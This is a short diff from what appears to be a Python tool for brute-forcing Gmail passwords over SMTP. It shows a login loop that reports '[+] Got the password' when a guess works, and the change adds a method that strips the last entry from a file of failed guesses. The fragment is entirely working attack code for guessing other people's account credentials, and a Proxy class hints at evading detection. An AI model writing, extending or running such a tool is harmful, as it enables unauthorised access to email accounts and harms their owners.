@@ -127,12 +127,26 @@ class Email:
 		try:
 			gmail_server.login(email, password)
 			correct_password = f"[+] Got the password [==>] {password}"
+			self.remove_correct_password()
 			print(Colors.green_color(correct_password))
 			exit()
 		except smtplib.SMTPAuthenticationError:
 			incorrect_password = f"[-] Incorrect password [==>] {password}"
 			print(Colors.purple_color(incorrect_password))
 
+	def remove_correct_password(self):
+		with open("incorrect_passwords.txt", "r") as f:
+			data = f.readlines()
+			f.close()
+			os.remove("incorrect_passwords.txt")
+			new_data = data[:-1]
+
+			for letters in new_data:
+				letters = letters.strip()
+				with open("incorrect_passwords.txt", "a") as f:
+					f.write(letters)
+					f.write("\n")
+					f.close()
 
 class Proxy:
 	def __init__(self):
